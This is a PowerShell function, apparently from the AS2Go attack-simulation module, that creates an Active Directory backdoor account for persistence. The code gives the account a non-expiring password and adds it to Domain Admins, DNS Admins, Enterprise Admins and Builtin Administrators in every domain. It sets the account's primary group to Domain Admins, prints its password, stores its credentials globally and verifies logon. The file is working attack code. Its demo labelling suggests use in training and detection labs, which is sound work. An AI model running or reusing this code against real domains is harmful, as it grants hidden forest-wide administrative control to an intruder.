<#
.SYNOPSIS
Creates a persistent backdoor user account with elevated group memberships.

.DESCRIPTION
Establishes persistent domain access by creating an administrative backdoor user account with elevated
group memberships (Domain Admins, Enterprise Admins, and Builtin Admins). The account is configured to
never expire and stores its credentials globally for later use. Handles missing or invalid BDUsersOU
configuration by falling back to the Users container automatically. Validates successful account
creation by testing logon and displaying group memberships.

.EXAMPLE
Invoke-BackdoorUserCreation
Runs the backdoor account creation workflow using the initialized AS2Go module configuration.

.INPUTS
None. This function does not declare pipeline input.

.OUTPUTS
Console messages and output from invoked commands; no dedicated result object is defined.
Global variables $global:BDUser, $global:BDSecurePass, $global:BDCred, and $global:BDCredUPN are set.

.NOTES
Private AS2Go function. Run from an initialized AS2Go module session.
Requires Domain Admin privileges and initialized module configuration (GroupDA, GroupDNSA, GroupEA).
If BDUsersOU is not configured or does not exist, automatically uses the Users container and updates config.

.COMPONENT
Category: Main Function

.FUNCTIONALITY
Creates a persistent backdoor user with elevated group memberships across the entire forest.
Automatically handles missing or invalid target OUs by falling back to the Users container.
Tests logon and displays group memberships to verify successful creation.
#>
function Invoke-BackdoorUserCreation {

    $info = Measure-FunctionRuntime -Begin

    If (-not $SkipClearHost) { Clear-Host }
    
    Write-AS2GoOutput -Type Header -M "Create a backdoor account with elevated group memberships for persistence"
    Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)
    Show-CurrentPhase -Phase  "https://cymulate.com/cybersecurity-glossary"   
    
    If ($UnAttended) {
        $answer = $Script:Yes
    }
    else {
        $answer = Show-DecisionPrompt
    }

    If ($answer -ne $Script:Yes) {
        Write-Log -Message "User chose not to proceed with Backdoor user creation."
        Measure-FunctionRuntime -End -Details $Info
        return
    }



    $FirstName = Get-Date -Format HHmmss
    $LastName = Get-Date -Format yyyyMMdd
    $samaccountname = "BD-$LastName.$FirstName"
    $sname = $samaccountname
    $TargetOU = Get-ASConfig -Setting "BDUsersOU"
    $Initials = "BD"
    $DisplayName = "$LastName, $Firstname (Backdoor)"
    $UPNSuffix = "@" + (Get-ADForest).RootDomain
    $title = "Backdoor"
    $UPN = ($samaccountname + $UPNSuffix)
    $bthumbnailPhoto = Join-Path -Path $Script:ASSetup -ChildPath "thumbnailPhotos\AS2Go_BD-User.jpg"
    $Description = "Backdoor Account (AS2Go Demo)"

    $BDUserPW = Get-RandomPassword
    $global:BDSecurePass = ConvertTo-SecureString -String $BDUserPW -AsPlainText -Force
    $global:BDUser = $samaccountname

    if ([string]::IsNullOrEmpty($TargetOU)) {
        Write-AS2GoOutput -Type Warning -Message "BDUsersOU not configured. Attempting to use Users container."
        $result = Convert-FromDNToCN -DistinguishedName $TargetOU
        $fqdn = $result.Split('/')[0]
        $UsersContainer = "CN=Users,$(([ADSI]"LDAP://RootDSE").defaultNamingContext)"
        $TargetOU = $UsersContainer
        Set-ASConfig -Setting "BDUsersOU" -Value $TargetOU
        Write-AS2GoOutput -Type Info -Message "Using Users container: $TargetOU"
    }
    else {
        try {
            $ouTest = Get-ADObject -Identity $TargetOU -ErrorAction Stop | Select-Object -ExpandProperty DistinguishedName
        }
        catch {
            Write-AS2GoOutput -Type Warning -Message "Configured BDUsersOU does not exist: $TargetOU. Attempting to use Users container."
            $result = Convert-FromDNToCN -DistinguishedName $TargetOU
            $fqdn = $result.Split('/')[0]
            $UsersContainer = "CN=Users,$(([ADSI]"LDAP://RootDSE").defaultNamingContext)"
            $TargetOU = $UsersContainer
            Set-ASConfig -Setting "BDUsersOU" -Value $TargetOU
            Write-AS2GoOutput -Type Info -Message "Using Users container: $TargetOU"
        }
    }

    $result = Convert-FromDNToCN -DistinguishedName $TargetOU
    $fqdn = $result.Split('/')[0]
    $Script:ASDC = Get-BestDomainController -domain $fqdn
    $NetBios = (Get-ADDomain -Server $fqdn).NetbiosName

    $user = "$NetBios\$samaccountname"
  

    try {
        New-ADUser  -UserPrincipalName $UPN  `
            -Name $sName  `
            -SamAccountName $samaccountname  `
            -GivenName $FirstName  `
            -Surname $LastName  `
            -Initials $Initials  `
            -Title $title   `
            -Description $Description  `
            -DisplayName $DisplayName   `
            -Path $TargetOU   `
            -OtherAttributes @{ 'employeeType' = 'AS2GoBackDoorUser' }  `
            -AccountPassword $global:BDSecurePass   `
            -PasswordNeverExpires $true  `
            -AccountExpirationDate $null  `
            -PassThru -Server $Script:ASDC | Enable-ADAccount

        Write-Host ""
        Write-AS2GoOutput -Type Bullet -Message "New backdoor account:" -Textmaker $user
        Write-AS2GoOutput -Type Bullet -Message "current password    :" -Textmaker $BDUserPW
    }
    catch {
        Write-AS2GoOutput -type Error -Message "Creation of backdoor user $UPN failed, likely due to '$_'."
        pause
        return
    }

    try {
        Add-ADGroupMember -Identity $Script:GroupDA.SID -Members $samaccountname  -Server $Script:ASDC
    }
    catch {
        Write-AS2GoOutput -Type Error -Message $_
    }

    try {
        Add-ADGroupMember -Identity $Script:GroupDNSA.SID -Members $samaccountname -Server $Script:ASDC
    }
    catch {
        Write-AS2GoOutput -Type Error -Message $_
    }

  

    try {
        $photoBytes = [byte[]](Get-Content -Path $bthumbnailPhoto -AsByteStream)
        Set-ADUser -Identity $samaccountname `
            -Replace @{ thumbnailPhoto = $photoBytes } `
            -Server $Script:ASDC `
            -ErrorAction SilentlyContinue
        Write-Log -Message "    >> Added thumbnailPhoto to backdoor account '$samaccountname'"
    }
    catch {
        Write-Log -Message "Failed to add thumbnailPhoto to backdoor account '$samaccountname'" -LEVEL WARN
    }

    try {
        Set-ADUser $samaccountname -Replace @{primaryGroupID = 512 }
        Write-Log -Message "    >> Changed PGID to 512 (Domain Admins) for backdoor account '$samaccountname'"
    }
    catch {
        Write-Log -Message "    >> FAILED to set PGID to 512 (Domain Admins) for backdoor account '$samaccountname'" -LEVEL WARN
    }

    Try {
        $rootDC = Get-BestDomainController -domain ((Get-ADForest).RootDomain)
        $NewMember = Get-ADUser -Identity $samaccountname -Server $Script:ASDC
        $EntAdmins = Get-ADGroup -Identity $Script:GroupEA.SID -Server $rootDC
    
        Write-AS2GoOutput -Type Bullet -Message "Adding account to   :" -Textmaker $($EntAdmins.DistinguishedName)
        Start-Sleep -Seconds 10
        Set-ADGroup -Identity $EntAdmins.DistinguishedName `
            -Add @{ member = $NewMember.DistinguishedName } `
            -Server $rootDC `
            -ErrorAction Stop
        Write-Log -Message "    >> Added backdoor user '$samaccountname' to $($Script:GroupEA.CanonicalName)"
    }
    Catch {
        Write-Log -Message "$_."
        Write-Log -Message "Failed to add backdoor account '$samaccountname' to Enterprise Admins on server $rootDC" -LEVEL WARN
    }

    #add also to built-in admins
    Foreach ($ADDomain in $Script:AllDomainsDetails) {
        Try {
            $SID = "S-1-5-32-544"
            $BuiltinAdmins = Get-ADGroup -Identity $SID -Server $ADDomain.DomainFQDN
  
           
            Start-Sleep -Seconds 2
            Set-ADGroup -Identity $BuiltinAdmins.DistinguishedName `
                -Add @{ member = $NewMember.DistinguishedName } `
                -Server $ADDomain.DomainFQDN `
                -ErrorAction Stop
            Write-Log -Message "    >> Added backdoor user '$samaccountname' to $($BuiltinAdmins.DistinguishedName)"
            Write-AS2GoOutput -Type Bullet -Message "Added account to   :" -Textmaker $($BuiltinAdmins.DistinguishedName)
        }
        Catch {
            Write-Log -Message "$_."
            Write-Log -Message "Failed to add backdoor account '$samaccountname' to Builtin Admins for domain $($ADDomain.DomainFQDN)" -LEVEL WARN
        }
    } 

    $newValue = Get-ADUser -Identity $samaccountname -Properties * -Server $Script:ASDC | Select-Object DistinguishedName
    Set-ASConfig -Setting "LastBDUser" -Value $newValue.DistinguishedName
    Get-ADUser -Identity $samaccountname -Properties * -Server $Script:ASDC | Select-Object Created, SamAccountName, userAccountControl, canonicalName, title, userPrincipalName | Format-Table | Out-Host
    Write-Host "Getting AD Principal Group Membership`n" -ForegroundColor $fgcH

    [int]$i = 0
    [bool]$works = $false

    try {
        Do {
            $i += 1
            $members = Get-ADPrincipalGroupMembership -Identity $samaccountname -Server $Script:ASDC -ErrorAction Stop
            Write-host "." -NoNewline -ForegroundColor $fgcH
        } Until (($members.count -gt 3) -or ($i -gt 50))

        $works = $true
    }
    catch {
        <#Do this if a terminating exception happens#>
    }

    Write-Host ""
    If ($works) {
        Get-ADPrincipalGroupMembership -Identity $samaccountname -Server $Script:ASDC | Format-Table name, GroupCategory, GroupScope, sid
    }
    else {
        (Get-Aduser -Identity $samaccountname -Properties MemberOf -Server $Script:ASDC | Select-Object MemberOf).MemberOf
    }

    $global:BDCredUPN = New-Object System.Management.Automation.PSCredential $UPN, $global:BDSecurePass
    $global:BDCred = New-Object System.Management.Automation.PSCredential $user, $global:BDSecurePass
    
    Start-Process pwsh -Credential $global:BDCred -ArgumentList "-NoExit", "-Command", "whoami" -WorkingDirectory $env:SystemRoot

    if (Test-ADLogon -Credential $global:BDCred -DomainController $Script:ASDC -Domain $fqdn) {
        Write-AS2GoOutput -Type Success -Message "Test logon for backdoor account '$UPN' succeeded."
    }
    else {
        Write-AS2GoOutput -Type Error -Message "Test logon for backdoor account '$UPN' FAILED."
    }

    Write-Log -Message "    >> Created Backdoor Account '$samaccountname'."
    Measure-FunctionRuntime -End -Details $Info
}
